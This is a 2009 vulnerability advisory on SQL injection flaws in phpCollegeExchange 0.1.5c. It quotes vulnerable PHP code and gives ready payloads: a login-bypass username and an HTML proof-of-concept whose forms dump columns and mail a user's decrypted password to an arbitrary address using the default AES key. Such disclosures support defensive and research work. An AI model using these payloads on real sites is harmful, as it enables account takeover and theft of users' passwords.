@@ -1,0 +1,171 @@
+phpCollegeExchange 0.1.5c Multiple SQL Injection Vulnerabilities
+
+Name phpCollegeExchange
+Vendor http://phpcollegeex.sourceforge.net
+Versions Affected 0.1.5c
+
+Author Salvatore Fresta aka Drosophila
+Website http://www.salvatorefresta.net
+Contact salvatorefresta [at] gmail [dot] com
+Date 2009-12-11
+
+X. INDEX
+
+I. ABOUT THE APPLICATION
+II. DESCRIPTION
+III. ANALYSIS
+IV. SAMPLE CODE
+V. FIX
+VI. DISCLOSURE TIMELINE
+
+I. ABOUT THE APPLICATION
+
+PhpCollegeExchange is a full fledged college community
+website.
+
+II. DESCRIPTION
+
+This application is affected by many SQL Injection
+security flaws. In order to exploit they, the Magic Quotes
+GPG (php.ini) must be Off.
+In this security advisory I reported only some of the
+vulnerable files.
+I tested 0.1.5c version only, however other versions may
+be also vulnerable.
+
+III. ANALYSIS
+
+Summary:
+
+A) Authentication Bypass
+B) Multiple SQL Injection
+
+A) Authentication Bypass
+
+Using a SQL Injection in the login process, a guest can
+bypass the authentication.
+In order to exploit it, The Magic Quotes GPG flag must be
+Off.
+
+Vulnerable code (functions.php):
+
+........
+
+function checkpass($handle,$pass){
+require_once($home."mysqlinfo.php");
+include("i_aeskey.php");
+$query="SELECT AES_DECRYPT(password,'$AES_key') FROM users WHERE
+(handle='$handle')";
+$result = mysql_query($query);
+
+if(mysql_num_rows($result))
+{
+if($r = mysql_fetch_array($result))
+{$dbpass=$r[0];}
+if($pass==$dbpass)
+{return 1;}
+
+........
+
+B) Multiple SQL Injection
+
+Searchend.php is affected by multiple SQL injection issues
+that allow a guest to view reserved information stored
+into the database.
+The following is an example of vulnerable code found in
+searchend.php.
+
+Vulnerable code (searchend.php):
+
+........
+
+$query = "SELECT * FROM Books";
+
+if(isset($_POST['searchby'])){$searchby=$_POST['searchby'];}else{$search
+by=$_GET['searchby'];}
+
+switch($searchby){
+
+........
+
+case "Title" :
+
+$title = $_POST['searchquery'];
+if(strlen($title)>2){
+//check length at least 3 chars
+
+$query .= " WHERE (title LIKE '%$title%') ORDER BY price";
+$result = mysql_query($query);
+
+........
+
+Another funny SQL injection may be seen in forgotpass.php.
+It can be manipulate to send to an arbitrary email address
+the password of a registered user, knowing the AES key.
+
+Vulnerable code:
+
+........
+
+if( isset($_POST["handle"]) ){
+
+........
+
+$query="SELECT AES_DECRYPT(password,'$AES_key'), email FROM users
+WHERE (handle='$handle')";
+$result = mysql_query($query);
+
+if(mysql_num_rows($result)){
+
+$r = mysql_fetch_array($result);
+
+$email = $r[1];
+$pass = $r[0];
+
+........
+
+mail("$email", "Your Book Exchange Password", $emailcontent);
+
+........
+
+IV. SAMPLE CODE
+
+A) Authentication Bypass
+
+Username: -1') UNION ALL SELECT 'foo'#
+Password: foo
+
+B) Multiple SQL Injection
+
+POC:
+
+<html>
+  <head>
+    <title>PoC - phpCollegeExchange 0.1.5c SQL Injection - Salvatore Fresta aka Drosophila</title>
+  </head>
+  <body>
+    <p>This code will print the columns number found by the injection.</p>
+    <p>In order to view the content of the fields, you must exchange the number with the field name, adding a FROM table_name at the end of the injection query.</p><br>
+    <form action="http://site/path/books/searchend.php" method="POST">
+      <input type="hidden" name="searchby" value="Title">
+      <input type="hidden" name="searchquery" value="%') UNION ALL SELECT 1,2,3,4,5,6,7,8,9#">
+      <input type="submit" value="Test searchend.php">
+    </form>
+    <p>This code will send to an arbitrary email address the password of a registered user.</p>
+    <p>In order to test the following bug, you must know the AES key (default: mykey) and a registered username. Please change the email account into the injection query to view the result.</p><br>
+    <form action="http://site/path/books/forgotpass.php" method="POST">
+      <input type="text" name="handle" value="-111111') UNION ALL SELECT AES_DECRYPT(password,'mykey'), 'here-your-email-address@account.com' FROM users WHERE handle='registered-username'#"><br>
+      <input type="submit" value="Test forgotpass.php">
+    </form>
+  </body>
+</html>
+
+V. FIX
+
+No fix.
+
+VIII. DISCLOSURE TIMELINE
+
+2009-12-11 Bug discovered
+2009-12-11 Initial vendor contact
+2009-12-11 Advisory Release
